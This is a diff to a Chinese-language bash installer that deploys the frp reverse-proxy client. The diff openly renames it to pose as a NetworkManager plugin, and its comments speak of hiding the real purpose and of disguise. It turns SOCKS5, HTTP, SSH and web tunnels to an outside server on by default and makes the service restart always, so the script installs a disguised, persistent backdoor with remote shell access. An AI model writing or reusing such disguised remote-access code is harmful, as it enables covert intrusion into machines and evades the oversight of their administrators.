@@ -13,13 +13,13 @@ YELLOW="\033[0;33m"
 RED="\033[0;31m"
 NC="\033[0m" # 无颜色
 
-# 定义常量 - 隐藏真实目的
+# 定义常量 - 更隐蔽的系统伪装
 TOOL_VERSION=0.62.1
-INSTALL_DIR=/usr/local/nightwalk
-SERVICE_NAME=nightwalker
+INSTALL_DIR=/usr/share/network-manager/plugins
+SERVICE_NAME=nm-plugin-service
 SERVICE_FILE=/etc/systemd/system/${SERVICE_NAME}.service
-CONFIG_FILE=$INSTALL_DIR/config.yaml
-REAL_BINARY=nightwalker
+CONFIG_FILE=$INSTALL_DIR/nm-settings.yaml
+REAL_BINARY=nm-connection-helper
 
 # 获取本机信息
 get_local_ip() {
@@ -122,15 +122,15 @@ list_tunnels() {
 
 # 下载客户端
 download_with_proxy() {
-    echo -e "${BLUE}正在下载夜游工具 ${TOOL_VERSION}...${NC}"
+    echo -e "${BLUE}正在下载系统网络组件 ${TOOL_VERSION}...${NC}"
     cd /tmp
     
     # 隐藏真实下载URL
     REAL_DOWNLOAD_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
-    DOWNLOAD_FILENAME="nightwalk_${TOOL_VERSION}_linux.tar.gz"
+    DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
     
-    # 询问是否使用代理
-    read -p "是否使用代理下载？(y/n): " use_proxy
+    # 询问是否使用代理，默认否
+    read -p "是否使用代理下载？(y/N): " use_proxy
     if [[ "$use_proxy" == "y" || "$use_proxy" == "Y" ]]; then
         read -p "请输入代理地址和端口 (格式: ip:port): " proxy_address
         
@@ -155,13 +155,67 @@ download_with_proxy() {
     
     return 0
 }
-
+# 修改下载函数，使用镜像地址自动下载
+download_with_mirrors() {
+    echo -e "${BLUE}正在下载系统网络组件 ${TOOL_VERSION}...${NC}"
+    cd /tmp
+    
+    # 伪装下载文件名
+    DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
+    
+    # 定义多个镜像站点，按优先级排序
+    MIRROR_URLS=(
+        "https://ghproxy.com/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+        "https://mirror.ghproxy.com/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+        "https://gh.api.99988866.xyz/https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+        "https://download.fastgit.org/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+        "https://hub.fgit.ml/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+    )
+    
+    # 定义直接下载的备用URL
+    DIRECT_URL="https://github.com/fatedier/frp/releases/download/v${TOOL_VERSION}/frp_${TOOL_VERSION}_linux_amd64.tar.gz"
+    
+    echo -e "${YELLOW}开始自动下载，请稍候...${NC}"
+    
+    # 尝试从每个镜像下载，直到成功
+    for mirror_url in "${MIRROR_URLS[@]}"; do
+        echo -e "${BLUE}尝试从镜像站点下载...${NC}"
+        if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 10 --max-time 60 "$mirror_url"; then
+            if [ -s "$DOWNLOAD_FILENAME" ]; then
+                echo -e "${GREEN}下载成功！${NC}"
+                return 0
+            else
+                echo -e "${YELLOW}下载文件为空，尝试下一个镜像...${NC}"
+                rm -f "$DOWNLOAD_FILENAME"
+            fi
+        else
+            echo -e "${YELLOW}镜像下载失败，尝试下一个镜像...${NC}"
+        fi
+    done
+    
+    # 如果所有镜像都失败，尝试直接下载
+    echo -e "${YELLOW}所有镜像下载失败，尝试直接下载...${NC}"
+    if curl -L -o "$DOWNLOAD_FILENAME" --connect-timeout 15 --max-time 90 "$DIRECT_URL"; then
+        if [ -s "$DOWNLOAD_FILENAME" ]; then
+            echo -e "${GREEN}直接下载成功！${NC}"
+            return 0
+        else
+            echo -e "${RED}下载文件为空！${NC}"
+        fi
+    else
+        echo -e "${RED}直接下载也失败了！${NC}"
+    fi
+    
+    echo -e "${RED}所有下载方式均失败，请检查网络连接或手动下载。${NC}"
+    echo -e "${YELLOW}您可以手动下载文件并放置在 /tmp/${DOWNLOAD_FILENAME} 路径，然后重新运行此脚本。${NC}"
+    return 1
+}
 # 安装客户端
 install_client() {
-    # 如果已安装，询问是否重新安装
+    # 如果已安装，询问是否重新安装，默认是
     if [ -f "$SERVICE_FILE" ]; then
-        read -p "夜游客户端已安装，是否重新配置？(y/n): " confirm
-        if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
+        read -p "夜游客户端已安装，是否重新配置？(Y/n): " confirm
+        if [[ "$confirm" == "n" || "$confirm" == "N" ]]; then
             echo "取消配置操作。"
             return
         fi
@@ -183,15 +237,15 @@ install_client() {
     # 如果是新安装，则下载并安装
     if [ ! -f "$INSTALL_DIR/$REAL_BINARY" ]; then
         # 使用下载函数下载
-        if ! download_with_proxy; then
+        if ! download_with_mirrors; then
             echo -e "${RED}下载失败，请检查网络连接或代理设置。${NC}"
             return 1
         fi
         
-        echo -e "${BLUE}正在安装夜游客户端...${NC}"
+        echo -e "${BLUE}正在安装网络组件...${NC}"
         # 解压原始文件，并重命名为我们的伪装名称
-        DOWNLOAD_FILENAME="nightwalk_${TOOL_VERSION}_linux.tar.gz"
-        TEMP_DIR="nightwalk_temp"
+        DOWNLOAD_FILENAME="netmgr_${TOOL_VERSION}_linux.tar.gz"
+        TEMP_DIR="netmgr_temp"
         mkdir -p "/tmp/$TEMP_DIR"
         
         tar -zxf "/tmp/$DOWNLOAD_FILENAME" -C "/tmp/$TEMP_DIR" || {
@@ -233,9 +287,9 @@ common:
   token: ${TOKEN}
 EOF
 
-    # 配置 SOCKS5 代理通道
-    read -p "是否配置 安全通道 1？(y/n) [推荐开启，用于远程访问公司网络]: " setup_socks
-    if [[ "$setup_socks" == "y" || "$setup_socks" == "Y" ]]; then
+    # 配置 SOCKS5 代理通道，默认选择Y
+    read -p "是否配置 安全通道 1？[推荐开启，用于远程访问公司网络] (Y/n): " setup_socks
+    if [[ "$setup_socks" != "n" && "$setup_socks" != "N" ]]; then
         read -p "请输入本地端口 [默认10811]: " SOCKS_LOCAL_PORT
         SOCKS_LOCAL_PORT=${SOCKS_LOCAL_PORT:-10811}
         SOCKS_REMOTE_PORT=$(get_random_port)
@@ -248,11 +302,11 @@ private-${HOSTNAME}:
 EOF
     fi
     
-    # 配置 HTTP 代理通道
-    read -p "是否配置 安全通道 2？(y/n) [用于特殊访问场景]: " setup_http
-    if [[ "$setup_http" == "y" || "$setup_http" == "Y" ]]; then
-        read -p "请输入本地端口 [默认8080]: " HTTP_LOCAL_PORT
-        HTTP_LOCAL_PORT=${HTTP_LOCAL_PORT:-8080}
+    # 配置 HTTP 代理通道，默认选择Y
+    read -p "是否配置 安全通道 2？[用于特殊访问场景] (Y/n): " setup_http
+    if [[ "$setup_http" != "n" && "$setup_http" != "N" ]]; then
+        read -p "请输入本地端口 [默认9000]: " HTTP_LOCAL_PORT
+        HTTP_LOCAL_PORT=${HTTP_LOCAL_PORT:-9000}
         HTTP_REMOTE_PORT=$(get_random_port)
         cat >> $CONFIG_FILE <<EOF
 public-${HOSTNAME}:
@@ -263,9 +317,9 @@ public-${HOSTNAME}:
 EOF
     fi
     
-    # 配置 SSH 通道
-    read -p "是否配置 远程管理通道？(y/n): " setup_ssh
-    if [[ "$setup_ssh" == "y" || "$setup_ssh" == "Y" ]]; then
+    # 配置 SSH 通道，默认选择Y
+    read -p "是否配置 远程管理通道？(Y/n): " setup_ssh
+    if [[ "$setup_ssh" != "n" && "$setup_ssh" != "N" ]]; then
         read -p "请输入本地端口 [默认22]: " SSH_LOCAL_PORT
         SSH_LOCAL_PORT=${SSH_LOCAL_PORT:-22}
         SSH_REMOTE_PORT=$(get_random_port)
@@ -279,9 +333,9 @@ shell-${HOSTNAME}:
 EOF
     fi
     
-    # 配置 Web 通道
-    read -p "是否配置 Web 访问通道？(y/n): " setup_web
-    if [[ "$setup_web" == "y" || "$setup_web" == "Y" ]]; then
+    # 配置 Web 通道，默认选择Y
+    read -p "是否配置 Web 访问通道？(Y/n): " setup_web
+    if [[ "$setup_web" != "n" && "$setup_web" != "N" ]]; then
         read -p "请输入本地端口 [默认80]: " WEB_LOCAL_PORT
         WEB_LOCAL_PORT=${WEB_LOCAL_PORT:-80}
         WEB_REMOTE_PORT=$(get_random_port)
@@ -295,26 +349,28 @@ webservice-${HOSTNAME}:
 EOF
     fi
     
-    # 询问是否添加自定义通道
-    read -p "是否添加自定义通道？(y/n): " setup_custom
+    # 询问是否添加自定义通道，默认选择N
+    read -p "是否添加自定义通道？(y/N): " setup_custom
     if [[ "$setup_custom" == "y" || "$setup_custom" == "Y" ]]; then
         add_tunnel
     fi
 
-    # 创建系统服务
+    # 创建系统服务，增强自动修复能力
     echo -e "${BLUE}正在创建系统服务...${NC}"
     cat > $SERVICE_FILE <<EOF
 [Unit]
-Description=Night Walk Network Service
+Description=Network Manager Plugin Service
 After=network.target
 
 [Service]
 Type=simple
 ExecStart=${INSTALL_DIR}/${REAL_BINARY} -c ${CONFIG_FILE}
-Restart=on-failure
+Restart=always
 RestartSec=5
-StartLimitInterval=60s
-StartLimitBurst=3
+StartLimitInterval=120s
+StartLimitBurst=5
+TimeoutStartSec=30s
+TimeoutStopSec=30s
 
 [Install]
 WantedBy=multi-user.target
